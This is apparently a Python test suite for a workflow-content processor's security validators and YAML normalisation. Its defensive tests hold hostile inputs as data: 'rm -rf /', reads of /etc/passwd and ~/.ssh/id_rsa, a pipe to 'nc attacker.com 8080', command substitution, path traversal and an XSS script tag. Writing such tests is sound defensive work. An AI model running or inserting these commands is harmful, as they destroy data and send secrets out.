#!/usr/bin/env python3

"""
Test suite for security validation and content normalization.
Tests input sanitization, vulnerability prevention, and messy content parsing.
"""

import unittest
from pathlib import Path

import pytest

from warp_content_processor.processors.schema_processor import ContentSplitter
from warp_content_processor.utils.normalizer import ContentNormalizer
from warp_content_processor.utils.security import (
    ContentSanitizer,
    InputValidator,
    SecurityValidationError,
    secure_yaml_dump,
    secure_yaml_load,
)


class TestSecurityValidation(unittest.TestCase):
    """Test security validation functionality."""

    def test_dangerous_script_injection(self):
        """Test rejection of script injection attempts."""
        dangerous_content = """
        name: Evil Workflow
        command: <script>alert('xss')</script>
        description: This contains dangerous content
        """

        with self.assertRaises(SecurityValidationError):
            ContentSanitizer.validate_content(dangerous_content)

    def test_command_injection_prevention_semicolon(self):
        """Test prevention of semicolon command injection."""
        with self.assertRaises(SecurityValidationError):
            ContentSanitizer.validate_command_content("echo test; rm -rf /")

    def test_command_injection_prevention_ampersand(self):
        """Test prevention of ampersand command injection."""
        with self.assertRaises(SecurityValidationError):
            ContentSanitizer.validate_command_content("ls && cat /etc/passwd")

    def test_command_injection_prevention_pipe(self):
        """Test prevention of pipe command injection."""
        with self.assertRaises(SecurityValidationError):
            ContentSanitizer.validate_command_content("command | nc attacker.com 8080")

    def test_command_injection_prevention_substitution(self):
        """Test prevention of command substitution injection."""
        with self.assertRaises(SecurityValidationError):
            ContentSanitizer.validate_command_content("test $(evil_command)")

    def test_command_injection_prevention_path_traversal(self):
        """Test prevention of path traversal injection."""
        with self.assertRaises(SecurityValidationError):
            ContentSanitizer.validate_command_content("path/../../etc/passwd")

    def test_file_path_validation_directory_traversal(self):
        """Test rejection of directory traversal paths."""
        with self.assertRaises(SecurityValidationError):
            ContentSanitizer.validate_file_path("../../../etc/passwd")

    def test_file_path_validation_absolute_path(self):
        """Test rejection of absolute paths."""
        with self.assertRaises(SecurityValidationError):
            ContentSanitizer.validate_file_path("/etc/passwd")

    def test_file_path_validation_home_directory(self):
        """Test rejection of home directory paths."""
        with self.assertRaises(SecurityValidationError):
            ContentSanitizer.validate_file_path("~/.ssh/id_rsa")

    def test_file_path_validation_unc_path(self):
        """Test rejection of UNC paths."""
        with self.assertRaises(SecurityValidationError):
            ContentSanitizer.validate_file_path("\\\\server\\share\\file")

    def test_file_path_validation_executable_extension(self):
        """Test rejection of executable file extensions."""
        with self.assertRaises(SecurityValidationError):
            ContentSanitizer.validate_file_path("file.exe")

    def test_valid_file_paths_yaml(self):
        """Test that valid YAML files are accepted."""
        try:
            result = ContentSanitizer.validate_file_path("workflow.yaml")
            self.assertIsInstance(result, Path)
        except SecurityValidationError:
            self.fail("Valid YAML path was rejected")

    def test_valid_file_paths_yml(self):
        """Test that valid YML files are accepted."""
        try:
            result = ContentSanitizer.validate_file_path("content.yml")
            self.assertIsInstance(result, Path)
        except SecurityValidationError:
            self.fail("Valid YML path was rejected")

    def test_valid_file_paths_markdown(self):
        """Test that valid Markdown files are accepted."""
        try:
            result = ContentSanitizer.validate_file_path("document.md")
            self.assertIsInstance(result, Path)
        except SecurityValidationError:
            self.fail("Valid Markdown path was rejected")

    def test_valid_file_paths_text(self):
        """Test that valid text files are accepted."""
        try:
            result = ContentSanitizer.validate_file_path("data.txt")
            self.assertIsInstance(result, Path)
        except SecurityValidationError:
            self.fail("Valid text path was rejected")

    def get_deeply_nested_structure(self):
        """Helper creating deeply nested structure for testing."""
        deeply_nested = {"a": {"b": {"c": {"d": {}}}}}
        # Create very deep nesting using reduce
        from functools import reduce

        deeply_nested = reduce(lambda acc, _: {"level": acc}, range(25), deeply_nested)
        return deeply_nested

    def get_large_array_structure(self):
        """Helper creating large array for testing."""
        return list(range(2000))

    def test_yaml_structure_validation_deep_nesting(self):
        """Test YAML structure validation for deep nesting."""
        deeply_nested_structure = self.get_deeply_nested_structure()
        with self.assertRaises(SecurityValidationError):
            ContentSanitizer.validate_yaml_structure(deeply_nested_structure)

    def test_yaml_structure_validation_large_arrays(self):
        """Test YAML structure validation for large arrays."""
        large_array_structure = self.get_large_array_structure()
        with self.assertRaises(SecurityValidationError):
            ContentSanitizer.validate_yaml_structure(large_array_structure)

    def test_unicode_normalization(self):
        """Test Unicode normalization and control character removal."""
        dangerous_unicode = "test\x00\x01\x02\x1f\x7f"
        sanitized = ContentSanitizer.sanitize_string(dangerous_unicode)

        self.assertEqual(sanitized, "test")
        self.assertNotIn("\x00", sanitized)

    def test_input_validator_workflow_name_valid_space(self):
        """Test workflow name validation with spaces."""
        try:
            result = InputValidator.validate_workflow_name("Test Workflow")
            self.assertTrue(result)
        except SecurityValidationError:
            self.fail("Valid name with spaces was rejected")

    def test_input_validator_workflow_name_valid_dash(self):
        """Test workflow name validation with dashes."""
        try:
            result = InputValidator.validate_workflow_name("Git-Status")
            self.assertTrue(result)
        except SecurityValidationError:
            self.fail("Valid name with dashes was rejected")

    def test_input_validator_workflow_name_valid_underscore(self):
        """Test workflow name validation with underscores."""
        try:
            result = InputValidator.validate_workflow_name("build_script")
            self.assertTrue(result)
        except SecurityValidationError:
            self.fail("Valid name with underscores was rejected")

    def test_input_validator_workflow_name_invalid_script(self):
        """Test workflow name validation rejects script tags."""
        with self.assertRaises(SecurityValidationError):
            InputValidator.validate_workflow_name("<script>")

    def test_input_validator_workflow_name_invalid_command(self):
        """Test workflow name validation rejects command injection."""
        with self.assertRaises(SecurityValidationError):
            InputValidator.validate_workflow_name("evil;command")

    def test_input_validator_workflow_name_invalid_null(self):
        """Test workflow name validation rejects null bytes."""
        with self.assertRaises(SecurityValidationError):
            InputValidator.validate_workflow_name("test\x00name")

    def test_input_validator_tags_valid_simple(self):
        """Test tag validation with simple tag."""
        try:
            result = InputValidator.validate_tag("git")
            self.assertTrue(result)
        except SecurityValidationError:
            self.fail("Valid simple tag was rejected")

    def test_input_validator_tags_valid_dash(self):
        """Test tag validation with dash."""
        try:
            result = InputValidator.validate_tag("test-tag")
            self.assertTrue(result)
        except SecurityValidationError:
            self.fail("Valid tag with dash was rejected")

    def test_input_validator_tags_valid_version(self):
        """Test tag validation with version tag."""
        try:
            result = InputValidator.validate_tag("v1")
            self.assertTrue(result)
        except SecurityValidationError:
            self.fail("Valid version tag was rejected")

    def test_input_validator_tags_invalid_space(self):
        """Test tag validation rejects spaces."""
        with self.assertRaises(SecurityValidationError):
            InputValidator.validate_tag("invalid tag")

    def test_input_validator_tags_invalid_punctuation(self):
        """Test tag validation rejects punctuation."""
        with self.assertRaises(SecurityValidationError):
            InputValidator.validate_tag("tag!")

    def test_input_validator_tags_invalid_uppercase(self):
        """Test tag validation rejects uppercase."""
        with self.assertRaises(SecurityValidationError):
            InputValidator.validate_tag("TAG")

    def test_input_validator_tags_invalid_leading_dash(self):
        """Test tag validation rejects leading dash."""
        with self.assertRaises(SecurityValidationError):
            InputValidator.validate_tag("-invalid")

    def test_secure_yaml_operations(self):
        """Test secure YAML loading and dumping."""
        safe_data = {"name": "Test", "command": "echo hello", "tags": ["test", "safe"]}

        # Test secure dump
        yaml_content = secure_yaml_dump(safe_data)
        self.assertIsInstance(yaml_content, str)

        # Test secure load
        loaded_data = secure_yaml_load(yaml_content)
        self.assertEqual(loaded_data, safe_data)


class TestContentNormalization(unittest.TestCase):
    """Test content normalization functionality."""

    def test_messy_yaml_normalization(self):
        """Test normalization of poorly formatted YAML."""
        messy_yaml = """
        name:Git Status Check
        command:git status
        tags:git,version-control
        shells:bash,zsh
        """

        normalized = ContentNormalizer.normalize_messy_yaml(messy_yaml)

        # Should add proper spacing
        self.assertIn("name: Git Status Check", normalized)
        self.assertIn("command: git status", normalized)

    def test_frontmatter_extraction(self):
        """Test YAML frontmatter extraction from Markdown."""
        content = """---
name: Test Workflow
description: A test workflow
---

# Additional Content

This is some additional markdown content.
"""

        frontmatter, remaining = ContentNormalizer.normalize_yaml_frontmatter(content)

        self.assertIsInstance(frontmatter, dict)
        self.assertEqual(frontmatter["name"], "Test Workflow")
        self.assertIn("Additional Content", remaining)

    def test_workflow_content_normalization(self):
        """Test workflow content normalization from various formats."""
        messy_workflow = """
        # Git Status Workflow
        command: git status  git diff
        description: Check git repository status
        tags: git version-control
        shells: bash zsh
        """

        normalized = ContentNormalizer.normalize_workflow_content(messy_workflow)

        self.assertEqual(normalized["name"], "Git Status Workflow")
        self.assertEqual(normalized["command"], "git status  git diff")
        self.assertIsInstance(normalized["tags"], list)
        self.assertIn("git", normalized["tags"])

    def test_prompt_content_normalization(self):
        """Test prompt content normalization."""
        messy_prompt = """
        ---
        name: Code Review
        ---

        Please review this {{language}} code and provide feedback on {{aspect}}:

        {{code}}
        """

        normalized = ContentNormalizer.normalize_prompt_content(messy_prompt)

        self.assertEqual(normalized["name"], "Code Review")
        self.assertIn("{{language}}", normalized["prompt"])
        self.assertIn("{{code}}", normalized["prompt"])

    def test_mixed_content_normalization(self):
        """Test normalization of mixed content types."""
        mixed_content = """
# Mixed Content File

---
# Workflow section
name: Git Status Check
command: git status
---

# Prompt section
name: Code Review Prompt
prompt: Please review the following {{language}} code

---
# Rule section
title: Use Semantic Versioning
description: All projects must follow semantic versioning
guidelines:
  - Version numbers should follow MAJOR.MINOR.PATCH
  - Use git tags for releases
"""

        documents = ContentNormalizer.normalize_mixed_content(mixed_content)

        # Should detect multiple content types
        types = [doc[0] for doc in documents]
        self.assertIn("workflow", types)
        self.assertIn("prompt", types)
        self.assertIn("rule", types)

    def test_code_block_extraction(self):
        """Test extraction of code blocks from Markdown."""
        markdown_content = """
# Test Document

Here's some bash code:

```bash
git status
git add .
git commit -m "Update"
```

And some Python:

```python
def hello():
    print("Hello, World!")
```
"""

        code_blocks = ContentNormalizer.extract_code_blocks(markdown_content)

        self.assertEqual(len(code_blocks), 2)
        self.assertEqual(code_blocks[0]["language"], "bash")
        self.assertIn("git status", code_blocks[0]["content"])
        self.assertEqual(code_blocks[1]["language"], "python")
        self.assertIn("def hello", code_blocks[1]["content"])


class TestRobustParsing(unittest.TestCase):
    """Test robust parsing of various content formats."""

    def test_parse_poorly_formatted_workflow(self):
        """Test parsing of poorly formatted workflow content."""
        poorly_formatted = """
name:Git Status Workflow
command:git status&&git diff
description:Check git repository status and show changes
tags:git,version-control,status
shells:bash,zsh,fish
arguments:
-name:show_diff
 description:Whether to show diff
 default_value:true
"""

        documents = ContentSplitter.split_content(poorly_formatted)

        self.assertTrue(len(documents) > 0)
        # Should be detected as workflow despite poor formatting
        doc_type, _ = documents[0]
        self.assertEqual(doc_type.value, "workflow")

    def test_parse_mixed_markdown_yaml(self):
        """Test parsing of mixed Markdown and YAML content."""
        mixed_content = """
# My Workflows

This file contains various workflows for development.

---
name: Build Project
command: npm run build
description: Build the project for production
tags:
  - build
  - npm
---

## Code Review Prompt

---
name: Review Code
prompt: |
  Please review the following {{language}} code:

  {{code}}

  Focus on {{aspect}} and provide detailed feedback.
arguments:
  - name: language
    description: Programming language
  - name: code
    description: Code to review
  - name: aspect
    description: Aspect to focus on
    default_value: general quality
---

## Development Rules

title: Code Quality Standards
description: Standards for code quality in our projects
guidelines:
  - Use meaningful variable names
  - Write unit tests for all functions
  - Follow the established coding style
  - Document public APIs
category: development
"""

        documents = ContentSplitter.split_content(mixed_content)

        # Should parse multiple documents
        self.assertGreaterEqual(len(documents), 3)

        # Check that different types are detected
        types = [doc_type.value for doc_type, _ in documents]
        self.assertIn("workflow", types)
        self.assertIn("prompt", types)

    def test_parse_malformed_yaml_with_recovery(self):
        """Test parsing of malformed YAML with error recovery."""
        malformed_yaml = """
name: Test Workflow
command: echo "test"
tags: [git, test  # Missing closing bracket
description: This YAML has syntax errors
shells:
  - bash
  - zsh
invalid_field: {unclosed: dict
"""

        # Should not crash and should attempt to parse what it can
        try:
            documents = ContentSplitter.split_content(malformed_yaml)
            # Should return something, even if it's marked as unknown
            self.assertIsInstance(documents, list)
        except Exception as e:
            self.fail(f"Parser should not crash on malformed input: {e}")

    @pytest.mark.timeout(5)
    def test_performance_with_large_content(self):
        """Test performance with large content files."""
        # Create large but valid content using helper
        large_content = self._generate_large_content()

        # Should parse without timeout
        documents = ContentSplitter.split_content(large_content)

        # Should find all 100 workflows
        self.assertEqual(len(documents), 100)

    def _generate_large_content(self):
        """Helper to generate large content for performance testing."""
        # Generate large content using list comprehension (already functional)
        large_content_parts = [
            f"""
---
name: Workflow {i}
command: echo "Processing item {i}"
description: Generated workflow number {i}
tags:
  - test
  - generated
  - item-{i}
shells:
  - bash
"""
            for i in range(100)
        ]
        return "\n".join(large_content_parts)

    def test_security_with_normalization(self):
        """Test that normalization doesn't bypass security validation."""
        malicious_content = """
---
name: Evil Workflow
command: <script>alert('xss')</script> && rm -rf /
description: This tries to bypass validation
---
"""

        # Should be caught by security validation
        documents = ContentSplitter.split_content(malicious_content)

        # Should return empty list due to security rejection
        self.assertEqual(len(documents), 0)


if __name__ == "__main__":
    unittest.main()
